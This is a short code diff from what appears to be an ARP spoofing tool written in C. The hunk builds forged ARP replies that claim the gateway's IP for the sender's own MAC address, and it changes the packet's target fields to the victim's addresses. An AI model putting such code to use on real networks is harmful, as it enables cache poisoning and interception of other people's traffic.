@@ -74,8 +74,8 @@ static void *arpthread(void *argp)
 	arp_hdr->operation = htons(0x2);	/* response arp type */
 	copy_mac(arp_hdr->sender_ha, arguments->self_ha);	/* mac to spoof */
 	copy_ipv4(arp_hdr->sender_pa, arguments->gateway_pa);	/* ip to spoof */
-	copy_mac(arp_hdr->target_ha, arguments->self_ha);	/* mac origin of the response (us) */
-	copy_ipv4(arp_hdr->target_pa, arguments->self_pa);	/* ip origin of the response (us) */
+	copy_mac(arp_hdr->target_ha, target->ha);	/* target ha we send the response to, (unused) */
+	copy_ipv4(arp_hdr->target_pa, target->pa);	/* target pa we send the response to, (unused) */
 
 	ifaceinfo.sll_family = AF_PACKET;
 	ifaceinfo.sll_protocol = htons(ETH_P_ARP);
